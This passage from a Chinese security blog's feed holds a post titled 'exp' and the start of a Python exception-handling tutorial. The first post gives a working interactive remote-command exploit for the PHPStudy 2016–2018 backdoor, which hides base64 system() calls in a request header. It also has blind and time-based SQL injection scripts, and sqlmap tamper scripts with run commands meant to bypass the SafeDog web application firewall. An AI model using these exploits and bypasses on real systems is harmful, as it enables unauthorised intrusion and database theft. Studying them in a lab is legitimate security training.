    </entry>
    
    
    
    <entry>
      <title>exp</title>
      <link href="/2022/11/03/%E7%BC%96%E7%A8%8B/exp/"/>
      <url>/2022/11/03/%E7%BC%96%E7%A8%8B/exp/</url>
      
        <content type="html"><![CDATA[<h2 id="模块解释"><a href="#模块解释" class="headerlink" title="模块解释"></a>模块解释</h2><table><thead><tr><th>名词</th><th>解释</th></tr></thead><tbody><tr><td>POC (Proof of Concept)</td><td>漏洞验证代码，验证漏洞的存在性。</td></tr><tr><td>EXP (Exploit)</td><td>渗透、攻击； 完整的漏洞利用工具</td></tr><tr><td>RCE (Remote Code|Command Execute)</td><td>* 漏洞的类型 * 在远程目标上执行代码或命令</td></tr></tbody></table><h2 id="1-PHPStudy-2016-2018"><a href="#1-PHPStudy-2016-2018" class="headerlink" title="1. PHPStudy_2016-2018"></a>1. PHPStudy_2016-2018</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 02--exp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="comment">#向目标提交请求，漏洞触发。</span></span><br><span class="line">banner = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">-------------------------------------------------------------</span></span><br><span class="line"><span class="string">PHPStudy_2016-2018</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ( )                  ( )        ( )                    </span></span><br><span class="line"><span class="string">    | |_      _ _    ___ | |/&#x27;)    _| |   _      _    _ __ </span></span><br><span class="line"><span class="string">    | &#x27;_`\  /&#x27;_` ) /&#x27;___)| , &lt;   /&#x27;_` | /&#x27;_`\  /&#x27;_`\ ( &#x27;__)</span></span><br><span class="line"><span class="string">    | |_) )( (_| |( (___ | |\`\ ( (_| |( (_) )( (_) )| |   </span></span><br><span class="line"><span class="string">    (_,__/&#x27;`\__,_)`\____)(_) (_)`\__,_)`\___/&#x27;`\___/&#x27;(_)   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                                    - cgjil</span></span><br><span class="line"><span class="string">-------------------------------------------------------------</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">url,cmd</span>):</span><br><span class="line">    cmd = base64.b64encode(<span class="string">&quot;system(&#x27;&#123;&#125;&#x27;);&quot;</span>.<span class="built_in">format</span>(cmd).encode()).decode()</span><br><span class="line">    headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Accept-Charset&#x27;</span>: cmd,<span class="comment">#请求头中提交参数，触发漏洞。</span></span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip,deflate&#x27;</span>,<span class="comment">#请求头中提交参数，触发漏洞。</span></span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 OPR/73.0.3856.284&#x27;</span></span><br><span class="line">    &#125; <span class="comment">#浏览器指纹</span></span><br><span class="line">    res = requests.get(url = url ,headers=headers)</span><br><span class="line">    html = res.content.decode(<span class="string">&quot;gbk&quot;</span>)</span><br><span class="line">    offset = html.find(<span class="string">&quot;&lt;!DOCTYPE html&quot;</span>)</span><br><span class="line">    result = html[<span class="number">0</span>:offset].strip()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge</span>():</span><br><span class="line">    j = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">        j +=random.choice(string.digits + string.ascii_letters)</span><br><span class="line">    <span class="keyword">return</span> j</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">url</span>):</span><br><span class="line">    flag1 = judge()</span><br><span class="line">    cmd = <span class="string">&quot;echo &quot;</span> + flag1</span><br><span class="line">    flag2 = attack(url, cmd)</span><br><span class="line">    <span class="keyword">if</span>  flag1 <span class="keyword">in</span> flag2 :</span><br><span class="line">        flag = <span class="built_in">input</span>(<span class="string">f&quot;[+] The Target is VULNERABLE!\n[+] Could you want to continue?[Y/n]&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="string">&quot;n&quot;</span>:</span><br><span class="line">             exit()</span><br><span class="line">        <span class="built_in">print</span>(flag)   </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            cmd = <span class="built_in">input</span>(<span class="string">&quot;[*] cmd &gt;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> cmd == <span class="string">&quot;q&quot;</span> <span class="keyword">or</span> cmd == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(attack(url, cmd))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Target is not enable! exit 3s later&quot;</span>)</span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(banner)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    </span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;Enter an url ：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Testing url:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url))</span><br><span class="line">    main(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-sqli-08"><a href="#2-sqli-08" class="headerlink" title="2.sqli_08"></a>2.sqli_08</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 00--sqli_08.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests, string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_length</span>(<span class="params">url</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">f&quot; and length(database())=<span class="subst">&#123;count&#125;</span>-- &quot;</span></span><br><span class="line">        response = requests.get(url=url + payload).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] The length of database :<span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># return count</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_name</span>(<span class="params">length,url</span>):</span><br><span class="line">    database_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    word = string.printable.strip()</span><br><span class="line">    <span class="comment"># print(length)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> word:</span><br><span class="line">            payload = <span class="string">f&quot; and ascii(substr((select database()),<span class="subst">&#123;i + <span class="number">1</span>&#125;</span>,1))=<span class="subst">&#123;<span class="built_in">ord</span>(j)&#125;</span>-- &quot;</span></span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            response = requests.get(url=url + payload).text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">                database_name += j</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[+] DataBase：<span class="subst">&#123;database_name&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="comment"># return database_name</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://192.168.149.211/sqli-labs/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line">    length = get_database_length(url)</span><br><span class="line"></span><br><span class="line">    get_database_name(length,url)</span><br><span class="line">    <span class="comment"># print(database_name)</span></span><br></pre></td></tr></table></figure><h2 id="3-sqli-09"><a href="#3-sqli-09" class="headerlink" title="3.sqli_09"></a>3.sqli_09</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 00--sqli_09.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests, string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_timeout</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url=url,timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;timeout&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_length</span>(<span class="params">url</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">f&quot; and if(length(database())=<span class="subst">&#123;count&#125;</span>,sleep(6),1) --+&quot;</span></span><br><span class="line">        <span class="comment"># print(url + payload)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;timeout&#x27;</span> <span class="keyword">in</span> get_timeout(url + payload):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] The length of database :<span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名字</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_name</span>(<span class="params">length,url</span>):</span><br><span class="line">    database_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    word = string.printable.strip()</span><br><span class="line">    <span class="comment"># print(length)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> word:</span><br><span class="line">            payload =<span class="string">f&quot; and if(ascii(substr((select database()), <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>, 1))=<span class="subst">&#123;<span class="built_in">ord</span>(j)&#125;</span>, sleep(5), 1) -- &quot;</span></span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;timeout&#x27;</span> <span class="keyword">in</span> get_timeout(url + payload):</span><br><span class="line">                database_name += j</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[+] DataBase：<span class="subst">&#123;database_name&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="comment"># return database_name</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://192.168.149.211/sqli-labs/Less-9/?id=1&#x27;&quot;</span></span><br><span class="line">    length=get_database_length(url)</span><br><span class="line">    get_database_name(length,url)</span><br></pre></td></tr></table></figure><h2 id="4-sqli-26"><a href="#4-sqli-26" class="headerlink" title="4.sqli_26"></a>4.sqli_26</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">temper创建：</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.HIGHEST</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    and aANDnd</span></span><br><span class="line"><span class="string">    or  oORr</span></span><br><span class="line"><span class="string">    []  %A0</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> </span><br><span class="line">    </span><br><span class="line">    payload = re.sub(<span class="string">r&quot;(?i)#&quot;</span>,<span class="string">&quot; and &#x27;1&quot;</span>,payload)</span><br><span class="line">    payload = re.sub(<span class="string">r&quot;(?i)and&quot;</span>,<span class="string">&quot;aANDnd&quot;</span>,payload)</span><br><span class="line">    payload = re.sub(<span class="string">r&quot;(?i)or&quot;</span>,<span class="string">&quot;oORr&quot;</span>,payload)</span><br><span class="line">    payload = re.sub(<span class="string">r&quot;(?i) &quot;</span>,<span class="string">&quot;%A0&quot;</span>,payload)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令执行：</span><br><span class="line">1.查看注入点</span><br><span class="line">python sqlmap.py -u &quot;http://192.168.149.211/sqli-labs/Less-26/?id=1&quot; -v3 --tamper gxx_sql-26 </span><br><span class="line">2.查看当前数据库</span><br><span class="line">python sqlmap.py -u &quot;http://192.168.149.211/sqli-labs/Less-26/?id=1&quot; -v3 --tamper gxx_sql-26 --dbs</span><br></pre></td></tr></table></figure><h2 id="5-绕过安全狗"><a href="#5-绕过安全狗" class="headerlink" title="5.绕过安全狗"></a>5.绕过安全狗</h2><p>以sql-01</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">temper:</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.HIGHEST</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"></span><br><span class="line">    payload = re.sub(<span class="string">r&#x27;(?i)and&#x27;</span>, <span class="string">&quot;/*!-*/-/*and*/&quot;</span>, payload)</span><br><span class="line">    payload = re.sub(<span class="string">r&#x27;(?i)order by&#x27;</span>, <span class="string">&quot;/**/order/*/%0a*a*/by/**/&quot;</span>, payload)</span><br><span class="line">    payload = re.sub(<span class="string">r&#x27;(?i)union all select&#x27;</span>, <span class="string">&quot;/*!union/*/*!%0b-/*!88888cas*/select*/&quot;</span>, payload)</span><br><span class="line">    payload = re.sub(<span class="string">r&#x27;(?i)from information_schema.tables&#x27;</span>, <span class="string">&quot;/*!from--%0f/*%0ainformation_schema.tables*/&quot;</span>, payload)</span><br><span class="line">    payload = re.sub(<span class="string">r&#x27;(?i)from information_schema.columns&#x27;</span>, <span class="string">&quot;/*!from--%0f/*%0ainformation_schema.columns*/&quot;</span>, payload)</span><br><span class="line">    payload = re.sub(<span class="string">r&#x27;(?i)from information_schema.SCHEMATA&#x27;</span>, <span class="string">&quot;/*!from--%0f/*%0ainformation_schema.SCHEMATA*/&quot;</span>, payload)</span><br><span class="line">    payload = re.sub(<span class="string">r&quot;(?i) as&quot;</span>,<span class="string">&quot; /*!14400as*/&quot;</span>,payload)</span><br><span class="line">    payload = re.sub(<span class="string">r&quot;(?i)char&quot;</span>,<span class="string">&quot;/*!14400char*/&quot;</span>,payload)</span><br><span class="line">    payload = re.sub(<span class="string">r&quot;(?i)database\(\)&quot;</span>,<span class="string">&quot;database(/*!/*/**WUHU%0f*/*/)&quot;</span>,payload)</span><br><span class="line">    payload = re.sub(<span class="string">r&quot;(?i)#&quot;</span>,<span class="string">&quot;-- &quot;</span>,payload)</span><br><span class="line">    payload = re.sub(<span class="string">r&quot;(?i)count\(*\)&quot;</span>,<span class="string">&quot;count(1)&quot;</span>,payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令执行：</span><br><span class="line">1.查看注入点</span><br><span class="line">python sqlmap.py -u &quot;http://192.168.149.211/sqli-labs/Less-1/?id=1&quot; -v3 --tamper gxx_sql-01.py --random-agent </span><br><span class="line">2.查看数据库</span><br><span class="line">python sqlmap.py -u &quot;http://192.168.149.211/sqli-labs/Less-1/?id=1&quot; -v3 --tamper gxx_sql-01.py --random-agent --dbs</span><br></pre></td></tr></table></figure><h2 id="6-爬虫"><a href="#6-爬虫" class="headerlink" title="6.爬虫"></a>6.爬虫</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, os</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_text</span>(<span class="params">url</span>):</span><br><span class="line">    obj = requests.get(url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> obj</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_text</span>(<span class="params">data</span>):</span><br><span class="line">    tree = etree.HTML(data.text)</span><br><span class="line">    imgs = tree.xpath(<span class="string">&#x27;//div[@class=&quot;article-content&quot;]/div&#x27;</span>)</span><br><span class="line">    img_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> imgs:</span><br><span class="line">        img = <span class="string">&#x27;http://192.168.149.211/pythonSpider/&#x27;</span> + i.xpath(<span class="string">&#x27;./img/@src&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        img_list.append(img)</span><br><span class="line">    <span class="keyword">return</span> img_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">img</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;C:/picker&#x27;</span>):</span><br><span class="line">        os.mkdir(<span class="string">&#x27;C:/picker&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> img:</span><br><span class="line">        pic_name = i.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        pic_content = get_text(i).content</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;C:/picker/<span class="subst">&#123;pic_name&#125;</span>&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;正在保存<span class="subst">&#123;pic_name&#125;</span>&quot;</span>)</span><br><span class="line">            f.write(pic_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    obj = get_text(<span class="string">&#x27;http://192.168.149.211/pythonSpider/&#x27;</span>)</span><br><span class="line">    img_list = parse_text(obj)</span><br><span class="line">    download(img_list)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>错误异常处理与面向对象</title>
      <link href="/2022/10/28/%E7%BC%96%E7%A8%8B/%E9%94%99%E8%AF%AF%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E4%B8%8E%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
      <url>/2022/10/28/%E7%BC%96%E7%A8%8B/%E9%94%99%E8%AF%AF%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E4%B8%8E%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="Python-异常"><a href="#Python-异常" class="headerlink" title="Python 异常"></a>Python 异常</h3><p>当程序运行时，因为遇到未知的错误而导致中止运行，便会出现Traceback 消息，打印异常。异常即是一个事件，该事件会在程序执行过程中发生，影响程序的正常执行。一般情况下，在Python 无法正常处理程序时就会发生一个异常。异常是Python 对象，表示一个错误。当Python 脚本发生异常时我们需要响应处理它，否则程序会终止执行。</p><table><thead><tr><th>异常</th><th>描述</th></tr></thead><tbody><tr><td>SyntaxError</td><td>语法错误</td></tr><tr><td>NameError</td><td>未声明&#x2F;初始化对象</td></tr><tr><td>IndexError</td><td>序列中没有此索引</td></tr><tr><td>KeyboardInterrupt</td><td>用户中断执行（Ctrl+C）</td></tr><tr><td>EOFError</td><td>没有内建输入，到达EOF 标记（Ctrl+D） 不适用windows 系统</td></tr><tr><td>IOError</td><td>输入&#x2F;输出操作失败</td></tr><tr><td>ValueError</td><td>当操作或函数接收到具有正确类型但值不适合的参数， 并且情况不能用更精确的异常，例如 IndexError来描述时将被引发。</td></tr><tr><td>TypeError</td><td>字符串与整数相加时触发。</td></tr></tbody></table><h3 id="检测（捕获）异常"><a href="#检测（捕获）异常" class="headerlink" title="检测（捕获）异常"></a>检测（捕获）异常</h3><p>如果一个语句发生了错误或异常，跳过该语句的执行，执行另外的语句。</p><h3 id="try-except-语句"><a href="#try-except-语句" class="headerlink" title="try except 语句"></a>try except 语句</h3><p>尝试执行try 语句，如果遇到异常（行不通）则执行except 语句。两个语句执行执行一个。</p><p>语法规则</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">pass</span>                <span class="comment"># 监控这里的异常</span></span><br><span class="line"><span class="keyword">except</span> Exception[, reason]:</span><br><span class="line">    <span class="keyword">pass</span>                <span class="comment"># 异常处理代码</span></span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 01 - 异常初探.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&quot;Please input your name: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Welcome, <span class="subst">&#123;username&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nSomething Error!&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="捕获多种异常"><a href="#捕获多种异常" class="headerlink" title="捕获多种异常"></a>捕获多种异常</h3><p>算命脚本：输入年龄，预测明年的年龄。</p><p>可以把多个except 语句连接在一起，处理一个try 块中可能发生的多种异常。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 02 - 捕获多种异常.py</span></span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">杰哥的算命脚本</span></span><br><span class="line"><span class="string">1. 预测年龄</span></span><br><span class="line"><span class="string">2. 预测财运</span></span><br><span class="line"><span class="string">3. 预测姻缘</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(banner)</span><br><span class="line"></span><br><span class="line">choice = <span class="built_in">input</span>(<span class="string">&quot;Please input the number: &quot;</span>)</span><br><span class="line">choice = <span class="built_in">int</span>(choice)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> choice != <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;好好学习...&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    age = <span class="built_in">input</span>(<span class="string">&quot;Please input your age: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;The next year your name: <span class="subst">&#123;<span class="built_in">int</span>(age) + <span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please input a number!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nCtrl + C&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nSomething Error!&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="捕获所有异常"><a href="#捕获所有异常" class="headerlink" title="捕获所有异常"></a>捕获所有异常</h3><p>如果出现的异常没有出现在指定要捕获的异常列表中，程序仍然会中断。可以使用在异常继承的树结构中，BaseException 是在最顶层的，所以使用它可以捕获任意类型的异常。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">except</span> BaseException:           <span class="comment"># 捕获所有异常，相当于except</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nSomething Error!&quot;</span>)</span><br></pre></td></tr></table></figure><p>Pyhton 异常树</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">BaseException                                               所有异常的基类</span><br><span class="line">     |</span><br><span class="line">     |</span><br><span class="line">     +-- SystemExit                                         解释器请求退出</span><br><span class="line">     |</span><br><span class="line">     |</span><br><span class="line">     +-- KeyboardInterrupt                                  用户中断执行(通常是输入^C)</span><br><span class="line">     |</span><br><span class="line">     |</span><br><span class="line">     +-- GeneratorExit                                      生成器调用close();方法时触发的</span><br><span class="line">     |</span><br><span class="line">     |</span><br><span class="line">     +-- Exception                          常规错误的基类，异常都是从基类Exception继承的。</span><br><span class="line">          |</span><br><span class="line">          +-- StopIteration                                 迭代器没有更多的值</span><br><span class="line">          |</span><br><span class="line">          +-- StandardError                                 所有的内建标准异常的基类</span><br><span class="line">          |    +-- BufferError                              缓冲区操作不能执行</span><br><span class="line">          |    +-- ArithmeticError                          所有数值计算错误的基类</span><br><span class="line">          |    |    +-- FloatingPointError                  浮点计算错误</span><br><span class="line">          |    |    +-- OverflowError                       数值运算超出最大限制</span><br><span class="line">          |    |    +-- ZeroDivisionError                   除(或取模)零 (所有数据类型)</span><br><span class="line">          |    +-- AssertionError                           断言语句失败</span><br><span class="line">          |    +-- AttributeError                           访问未知对象属性</span><br><span class="line">          |    +-- EnvironmentError                         操作系统错误的基类</span><br><span class="line">          |    |    +-- IOError                             输入输出错误</span><br><span class="line">          |    |    +-- OSError                             操作系统错误</span><br><span class="line">          |    |         +-- WindowsError (Windows)         系统调用失败</span><br><span class="line">          |    |         +-- VMSError (VMS)                 系统调用失败</span><br><span class="line">          |    +-- EOFError                                 没有内建输入,到达EOF 标记</span><br><span class="line">          |    +-- ImportError                              导入模块/对象失败</span><br><span class="line">          |    +-- LookupError              无效数据查询的基类&amp;#xff0c;键、值不存在引发的异常</span><br><span class="line">          |    |    +-- IndexError                          索引超出范围</span><br><span class="line">          |    |    +-- KeyError                            字典关键字不存在</span><br><span class="line">          |    +-- MemoryError              内存溢出错误(对于Python 解释器不是致命的)</span><br><span class="line">          |    +-- NameError                未声明/初始化对象 (没有属性)</span><br><span class="line">          |    |    +-- UnboundLocalError                   访问未初始化的本地变量</span><br><span class="line">          |    +-- ReferenceError           弱引用(Weak reference)试图访问已经垃圾回收了的对象</span><br><span class="line">          |    +-- RuntimeError                             一般的运行时错误</span><br><span class="line">          |    |    +-- NotImplementedError                 尚未实现的方法</span><br><span class="line">          |    +-- SyntaxError                              语法错误</span><br><span class="line">          |    |    +-- IndentationError                    缩进错误</span><br><span class="line">          |    |         +-- TabError                       Tab 和空格混用</span><br><span class="line">          |    +-- SystemError                              一般的解释器系统错误</span><br><span class="line">          |    +-- TypeError                                对类型无效的操作</span><br><span class="line">          |    +-- ValueError                               传入无效的参数</span><br><span class="line">          |         +-- UnicodeError                     